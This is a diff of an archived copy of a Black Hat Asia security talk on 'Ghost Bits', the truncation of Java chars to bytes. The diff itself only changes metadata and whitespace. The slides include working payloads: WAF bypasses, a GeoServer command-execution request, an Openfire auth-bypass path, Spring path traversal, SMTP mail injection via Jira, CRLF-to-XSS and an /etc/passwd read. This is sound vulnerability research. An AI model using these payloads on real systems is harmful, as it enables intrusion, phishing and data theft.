@@ -5,18 +5,21 @@ resource: "https://i.blackhat.com/Asia-26/Presentations/Asia-26-Bai-Cast-Attack-
 tags: [whitepaper, webseclist-reference]
 generated:
   by: webseclist-refs/1
-  at: "2026-08-08T18:47:06+00:00"
+  at: "2026-08-11T17:41:10+00:00"
 status: stable
-stale_after: 2027-08-08
+stale_after: 2027-08-11
 sources:
   - id: original
     resource: "https://i.blackhat.com/Asia-26/Presentations/Asia-26-Bai-Cast-Attack-Ghost-Bits-4.23.pdf"
     title: "Cast Attack: A New Threat Posed by Ghost Bits in Java"
+    author: Xinyu Bai, Zhihui Chen
 also_at: []
-authors: []
+authors:
+  - Xinyu Bai
+  - Zhihui Chen
 canonical_url: ""
 cited_by:
-  - "2026-ai.md:79"
+  - "2026-ai.md:56"
 commit: ""
 content_sha256: 5a786294da66e41ec951879ae824482cb1145e53b84d08912c31a800e3f0c401
 depth: full
@@ -30,8 +33,8 @@ publisher: ""
 publisher_english: ""
 raw_sha256: b409121cc2b6d273653441558a329caa3dad53563cde64bdd18aba48032c1a27
 retrieved_from: "https://i.blackhat.com/Asia-26/Presentations/Asia-26-Bai-Cast-Attack-Ghost-Bits-4.23.pdf"
-retrieved_kind: live
-retrieved_utc: "2026-08-08T18:47:06+00:00"
+retrieved_kind: stored
+retrieved_utc: "2026-08-11T17:41:10+00:00"
 slug: cast-attack-new-threat-posed-ghost-bits-java
 snapshot: ""
 title_english: ""
@@ -41,11 +44,11 @@ translation_of: ""
 
 # Cast Attack: A New Threat Posed by Ghost Bits in Java
 
-**Cast Attack: A New Threat Posed by Ghost Bits in Java** - Author not stated, Publisher not stated.
+**Cast Attack: A New Threat Posed by Ghost Bits in Java** - Xinyu Bai, Zhihui Chen, Publisher not stated.
 
 - Published: date not stated
 - Original: <https://i.blackhat.com/Asia-26/Presentations/Asia-26-Bai-Cast-Attack-Ghost-Bits-4.23.pdf>
-- Preserved from: https://i.blackhat.com/Asia-26/Presentations/Asia-26-Bai-Cast-Attack-Ghost-Bits-4.23.pdf (live) on 2026-08-08
+- Preserved from: https://i.blackhat.com/Asia-26/Presentations/Asia-26-Bai-Cast-Attack-Ghost-Bits-4.23.pdf (stored) on 2026-08-11
 - Licence: unknown
 
 Rights remain with the original author and publisher. This is a research
@@ -66,10 +69,13 @@ Speakers
     Photo     B1u3r(浅蓝)                                   Photo      1ue
                   blue@ixsec.org                                           1ue1uekin8@gmail.com
 
+
+
 Security Researcher                                   Security Engineer @ AlibabaCloud
 Focused on Web & Application Vulnerability Research   Focus on Application security
    @iSafeBlue                                            @luelueking
    @b1u3r                                                @1ue1166323
+
 
 Contributor
 Zongzheng Zheng SpringKill
@@ -77,6 +83,7 @@ Zongzheng Zheng SpringKill
 What’s Ghost Bits ?
 Concept
 ⽘
+    ↓
     X
 BurpSuite Encoding Story
       The Discovery                                      STEP 1: INPUT                         The Issue
@@ -86,10 +93,18 @@ BurpSuite Encoding Story
                            \u5927\u9ED1\u9614
                                                                          DataOutputStream#writeBytes(String s)
 
+
+
+
  Characters converted to weird bytes:      STEP 2: UNEXPECTED OUTPUT
+
+
 
                                                        \x27\xd1\x14
 High eight bits?  Ghost Bits !!!
+
+
+
 
   Ghost   1. (byte) ch
    bits   2. ch & 0xff
@@ -102,9 +117,15 @@ WAF Bypass
 BCEL Ghost Bits — WAF Bypass
   new ClassLoader().loadClass(“$$BCEL$$伟ﾋ伈伀伀伀伀伀伀伀乭乑乍乏ￛ乀伐伽ﾛﾄﾬﾭ为...”).newInstance()
 
+
+
   STEP 1   ClassLoader#createClass()                         STEP 2   Utility#decode()                   VULNERABILITY POINT   ByteArrayOutputStream#write(ch)
 
+
+
                                                                          Utility.java — Decoding Logic
+
+
 
   1 char[]         chars      =     s.toCharArray();
   2 CharArrayReader               car    =    new       CharArrayReader(chars);
@@ -116,6 +137,7 @@ BCEL Ghost Bits — WAF Bypass
   8 }
 Jackson Ghost Bits — WAF Bypass
                     WAF SEES                                charToHex — ch & 255                           JACKSON SEES
+
 
 INPUT STRING                                                                               AFTER CHARTOHEX DECODING
 
@@ -131,6 +153,7 @@ INPUT STRING                                                                    
                                                                                            JACKSON MAPS FIELD AS
 WAF INTERPRETS AS
                                        CHARACTER MAPPING
+
 
                                         丰       → 0x4E30        & 255         → 0x30   0                1 union select
                \u丰丰耳失...
@@ -164,17 +187,24 @@ fastjson \u escape
                                                                                      Vai                  Thai                           Thai                  Punjabi
                                                                                     U+A620              U+0E50                         U+0E54                  U+0A66
 
+
 The Mechanism                                                                   digit() → "0"         digit() → "0"                  digit() → "4"           digit() → "0"
 
 Integer.parseInt uses Character.digit(), which accepts Unicode decimal
 digits from various scripts.
+
 
                parseInt( "0040" , 16) = 0x0040 →          @
 fastjson \x escape
  WAF SEES                 {"@type": "..."}   ✗ BLOCK   BYPASSED PAYLOAD
                                                                                         {"\x4_type": ...}                       ✓ PASS
 
+
+
+
             JSONLexerBase.java
+
+
 
  case 'x':                                                      '4'                                             '_'
      char x1 = this.ch = this.next();                          x1 = 0x34 (52)                        +         x2 = 0x5F (95)
@@ -231,7 +261,11 @@ Full-width URL Encoding Bypass
         ２                  2                 ｅ                        e         ｆ          f
         U+FF12            U+0032             U+FF45                U+0065       U+FF46   U+0066
 
+
+
+
       %２ｅ%２ｅ%２ｆ         → decoded byte   → %2e%2e%2f   =        ../
+
 
       STEP 1
                     /opt/ ％２ｅ％２ｅ％２ｆ tmp ％２ｆ test       /opt/../tmp/test
@@ -243,6 +277,8 @@ Full-width URL Encoding Bypass
                     /opt/ ％２ｅ％２ｅ％２ｆ tmp ％２ｆ test       /opt/../tmp/test
    File.toURL()
 
+
+
       STEP 3
                   file:/opt/ ％２ｅ％２ｅ％２ｆ tmp ％２ｆtest     file:/opt/../tmp/test
    new URL(...)
@@ -251,12 +287,17 @@ Ghost-Bit URL Encoding Bypass
 Spring                                      Undertow
 Input                                       Input
 
+
  1u%65.陪sp                                   1ue\u2e6asp
 
 Method                                      Method                                                                DECODED RESULT
 
+
                                                                                                                  1ue.jsp
 StringUtils.uriDecode("1u%65.陪sp", UTF_8)   URLUtils.decode("1ue\u2e6asp", "UTF-8", false, false, sb)
+
+
+
 
 Jetty                                       Vert.x
 Input                                       Input                                                                   Status: Success
@@ -274,9 +315,14 @@ Base64 Decode Bypass
             pem_convert_array                                pem_convert_array                                 pem_convert_array                                 pem_convert_array
               [ 0x4D ] = "M"                                    [ 0x58 ] = "X"                                   [ 0x56 ] = "V"                                     [ 0x6C ] = "l"
 
+
               base64 idx = 19                                  base64 idx = 23                                   base64 idx = 21                                   base64 idx = 37
 
+
+
+
                      new BASE64Decoder().              decodeBuffer (" ōŘŖŬ ") = new BASE64Decoder().                         decodeBuffer (" MXVl ") → "1ue"
+
 
 AFFECTED JDK INTERNAL DECODERS                                         Ghost Bit: char index silently truncated to low byte — pem_convert_array[decode_buffer[i] & 255]
 
@@ -286,9 +332,13 @@ AFFECTED JDK INTERNAL DECODERS                                         Ghost Bit
 
      com.sun.xml.internal.messaging.saaj.util.Base64
 
+
                                                         WAF sees unrecognizable Unicode →          PASS →decoder executes payload
 GeoServer CVE-2024-36401 bypass
             WAF Rule:         block if URL contains         Runtime       |   Runtime   |   Ru%6[eE]time
+
+
+
 
      ATTACKER                                             WAF                                                  JETTY                                                   GEOSERVER
 
@@ -298,7 +348,10 @@ getRu%6>time()                                        ≠ Runtime | ≠ Ru%6etim
                                                       → No match → PASS ✓                                                                                         Runtime(),
                                                                                                                                                                   'touch /tmp/...')
 
+
+
              HTTP Request (actual payload sent)                                                                                        Server Filesystem — /tmp
+
 
 GET /geoserver/wfs? service=WFS&version=2.0.0                                                                              root@34d7e49ed3fe:/tmp# ls
 &request=GetPropertyValue                                                                                                  hsperfdata_root
@@ -341,9 +394,14 @@ POST /exploit HTTP/1.1                                                          
 Content-Disposition:form-data; name= " class                                                        Content-Disposition:form-data; name*=utf-8'' 㹣౬ᙡ⑳⑳
 .module.classLoader.resources.context.parent.pipeline.first.directory"                              .module.classLoader.resources.context.parent.pipeline.first.directory"
 
+
+
 webapps/ROOT                                                                                        webapps/ROOT
 ---------------------------AERDaopYEqKNTRHptzsnYKFZbjMjNnbBuV                                       ---------------------------AERDaopYEqKNTRHptzsnYKFZbjMjNnbBuV
 ...                                                                                                 ...
+
+
+
 
       WAF BLOCKED                                                        Pattern: 'class' matched         WAF BYPASSED                                                       Pattern: No match
 RealWorld
@@ -352,16 +410,25 @@ Attack Vector
 "Ghost Bits" Bypass Auth：Openfire
 (CVE-2023-32315 )
 
+
+
   From /../ to
   Auth Bypass
 Vulnerability Background & Core Logic (CVE-2023-32315)
+
+
 
  The Openfire Admin Console uses AuthCheckFilter to manage
  access control. The vulnerability lies in the logic governing the
  Exclusion List (Excludes).
 
+
+
       Vulnerable Path
        org.jivesoftware.admin.AuthCheckFilter
+
+
+
 
          CORE LOGIC
          If a request path matches an exclusion rule (e.g., setup/setup-*), the doExclude flag is set to true, bypassing subsequent authentication checks.
@@ -392,16 +459,21 @@ instead of a literal dot ...
                                                                                AuthCheckFilter and most WAFs perceive %2> as an invalid URL
                                                                                encoding or a harmless string.
 
+
                                                                                Jetty's TypeUtil.convertHexDigit suffers from "Ghost Bits Loss"
                                                                                when handling non-hexadecimal characters, forcing them into
      /setup/setup-s/%2>%2>/%2>%2>/log.jsp                                      valid hex values.
 Source Analysis: Jetty's Ghost Bits Loss
 The root cause is an optimization algorithm in org.eclipse.jetty.util.TypeUtil#convertHexDigit.
 
+
+
        KEY INSIGHT
 
       Designed for high performance, this function lacks
       strict range validation for input characters.
+
+
 
       Uses bitwise operations to "collapse" characters into
       the 0-15 range.
@@ -411,9 +483,15 @@ The root cause is an optimization algorithm in org.eclipse.jetty.util.TypeUtil#c
 Mathematical Proof: Why > equals E?
  By tracing the character > through the convertHexDigit algorithm, we can see how the identifying "bits" are stripped away:
 
+
+
+
        Character >                                                                 Step 1: Execute c & 0x1f
 
    ASCII value 0x3E Binary: 0011 1110                                          0011 1110 & 0001 1111 = 11110 Decimal 30. High bits truncated ("Ghost Bits").
+
+
+
 
        Step 2: Execute (c >> 6)                                                    Final Calculation
 
@@ -422,6 +500,7 @@ Mathematical Proof: Why > equals E?
 The Attack-Defense Game: Evolution of
 Obfuscation
 Using %2> is significantly more effective in real-world scenarios than %u002e:
+
 
         Comparison                                                                 Attack Chain
 
@@ -435,10 +514,14 @@ Using %2> is significantly more effective in real-world scenarios than %u002e:
   • Obfuscation Potential: %u002e = Static vs %2> = High (e.g., %2^, %2~
     might also map to .)                                                         Openfire Filter permits (no blacklist match)
 
+
                                                                                  Jetty decodes and canonicalizes to ..→
                                                                                  Unauthorized Admin Access
 "Ghost Bits" Read Arbitrary File: Spring
 CVE-2025-41242
+
+
+
 
                        Let‘s “Hack” the Spring
                              Framework!!!
@@ -450,6 +533,8 @@ Patch First - Insights from GitHub PR #34673
 
                 StringUtils.uriDecode
 
+
+
   Bits "Collapse"
  Java char is 16-bit, but      baos.write    only accepts the lowest
  8 bits.
@@ -458,14 +543,20 @@ Patch First - Insights from GitHub PR #34673
  discarded during the write operation, leaving only the low 8 bits
  to represent the character.
 
+
+
                                                                                           ghost bits
 POC & Call Stack
   Function Call Chain   POC Exploit
+
+
+
 
                                       HTTP Request & Response
 The Crafted Payload - Why "阮严灵丰丰甲来"?
                RESULT       /.%u002e/
    CHARACTER    UNICODE                    TRUNCATED BYTE   ASCII RESULT
+
 
       阮          U+962E                         0x2E             .
 
@@ -487,6 +578,7 @@ Art of Bypass - Time Gap & Double Parsing
      // ResourceHttpRequestHandler#getResource
      if (isInvalidPath(path)) return null; // Checks for "../" literal
 
+
     Bypass Principle: Path is /.%u002e/ . No ../ substring found. Returns Green (Safe).
     Jetty’s Physical Execution
       Enters PathResource#resolve                  .
@@ -494,6 +586,7 @@ Art of Bypass - Time Gap & Double Parsing
     Critical Feature: Recognizes %u002e as Unicode dot (.).
 
     Collapsed Path:          /.%u002e/          → ../../
+
 
       Conclusion
       Spring sees "harmless" Unicode, while Jetty interprets "lethal" directory traversal markers.
@@ -518,9 +611,12 @@ SMTP Protocol Smuggling
 
    Using the \r\n generated by the "Ghost Bits", attackers can prematurely close current SMTP commands.
 
+
  Attack Payload Example
 
   attacker[Ghost\r\n]DATA[Ghost\r\n]Subject: You are Hacked![Ghost\r\n][Ghost\r\n]Malicious Link...
+
+
 
  Actual Raw Message
 
@@ -533,15 +629,20 @@ SMTP Protocol Smuggling
 The Domino Effect (Supply Chain Impact)
  From Bottom to Top: A Fallen Supply Chain
 
+
       Core Points
  angus.mail does not exist in isolation; it is a foundational   $800 bugbounty
  pillar of the Java ecosystem.
+
+
+
 
         As long as an upstream application allows user input
         for email addresses and sends emails from the                            CVE-2025-57733
         backend, it can trigger the underlying truncation.
 Case Study 1 — System Mail Hijacking
    Affected Versions: Jira v9.12.16                                         Jira Turned into an Official Phishing Launcher
+
 
   Attack Chain                                                                 Lethal Impact
 
@@ -566,6 +667,9 @@ Case Study 1 — System Mail Hijacking (Jira)
                                      瘊畉瘠界畏畖畅瘠留畏畕瘡瘍瘊
                                      瘮瘍瘊畑畕畉畔瘍瘊@qq.com
 
+
+
+
                                      2336485988@qq.com>
                                      DATA
                                      Subject:PWNED
@@ -580,6 +684,7 @@ Restriction Bypass (Confluence)
    Administrator configures Confluence to only allow registrations from employees with the @company.com suffix.
 
    Attack Chain
+   →
        Attacker Input:     hacker[GhostBits]@company.com
 
    → Application Validation:
@@ -634,6 +739,8 @@ Step 7   Attacker successfully received the registration email and registered th
                  Email Received by Attacker                                      Registration Email Content (HTML Source)
 "Ghost Bits" in CRLF to …?
 
+
+
                              Two cases to
                         demonstrate what else
                           "ghost bits" can do
@@ -641,6 +748,9 @@ CASE1 - Apache HttpClient Header CRLF
 
 Vulnerability: HTTPCLIENT-1974 / HTTPCLIENT-1978 (≤ 4.5.9)
                                                              (ORG.APACHE.HTTP.UTIL.BYTEARRAYBUFFER)
+
+
+
 
     Older versions of Apache HttpClient blindly
     cast character arrays to bytes when building
@@ -654,6 +764,9 @@ CASE1 - CRLF …... Request Smuggling !
                                               GET /auth HTTP/1.1
                                               X-Auth-Token: 1\u760D\u760APOST /newRequest...
 
+
+
+
                                                  Backend Target
           The Injection (Java Application)   Sees 2 Requests (Mutation)
 
@@ -666,9 +779,16 @@ CASE2 - JDK Native HttpServer Flaw
 
  CVE-2026-21933                                            Server reflects input into Response Headers.
 
+
  com.sun.net.httpserver.HttpServer demo
 
+
+
+
                                                                                                                   Injection Response Header
+
+
+
 
   Servers are equally vulnerable. If the JDK HttpServer reflects unvalidated input like a URL query directly into a Response Header, it sets the stage for
   response manipulation.
@@ -680,23 +800,33 @@ CASE2 - CRLF …… XSS!
   Length%3A%2025%E7%98%8D%E7%98%8A%E7%98%8D%E7%98%8A%3Cscript%3Ealer          seHeaders
   t%281%29%3C%2Fscript%3E%E7%98%8D%E7%98%8A%E4%BC%80'                         sun.net.httpserver.ExchangeImpl#write
 
+
+
     HTTP Response Structure                             瘍瘊 == \r\n
+
 
  HTTP/1.1 200 OK\r\n
  Custom-Header: Cu瘍瘊
  Content-Type: text/html瘍瘊
  Content-Length: 25瘍瘊
 
+
  <script>alert(1)</script>
 Conclusion
 Summary and outlook
 Ghost Bits: Polymorphism
+
+
+
 
                                                         Authentication   Request
                                                                                          ？
    XSS   SMTP Injection   Path Traversal                Bypass           Smuggling
                                            WAF Bypass
                                                                                      …
+
+
+
 
                                            GhostBits
 Ghost Bits: Auto Discovery
@@ -715,6 +845,9 @@ ActiveJ – HTTP CRLF
 
  Secrux Result
 
+
+
+
                       ActiveJ /cookie
 Lettuce – Ghost Redis StringValue
                                                                              CommandArgs.StringArgument#writeString
@@ -732,9 +865,16 @@ Lettuce – Ghost Redis StringValue
                                                                                  target.writeBytes(CRLF);
                                                                                }
 
+
+
+
                                                                              { "name" : "1ue" , "target"             : "hack"      } // ,"target":"flag{test}"}
 
+
+
+
                                                                                INJECTED                                                               ORIGINAL
+
 
                                                                               { "name"::"1ue", "target":"hack"}                                      { "name"::"1ue", "target"::"flag{test}"}
 
@@ -747,15 +887,26 @@ XMLWriter – Ghost Tag key
 
    INPUT SOURCE
 
+
+
+
  Original XML                          XML as seen by parser
+
+
+
 
                   <陪>1ue</陪>                                   <j>1ue</j>
 Jodd – Ghost Path
         ORIGINAL PATH                                 JODD SEES
 
+                                         →
  file:///ťŴţ%2fŰšųųŷŤ                            file:///etc/passwd
 
+
+
+
                                                                   /etc/passwd
+
 
   root:x:0:0:root:/root:/bin/bash
   daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
@@ -787,6 +938,8 @@ Takeaways
                                              related vulnerabilities and bypass techniques.
  We have only scratched the surface
               Thanks
+
+
 
 @b1u3r
 @1ue1166323            Open to discussion and collaboration
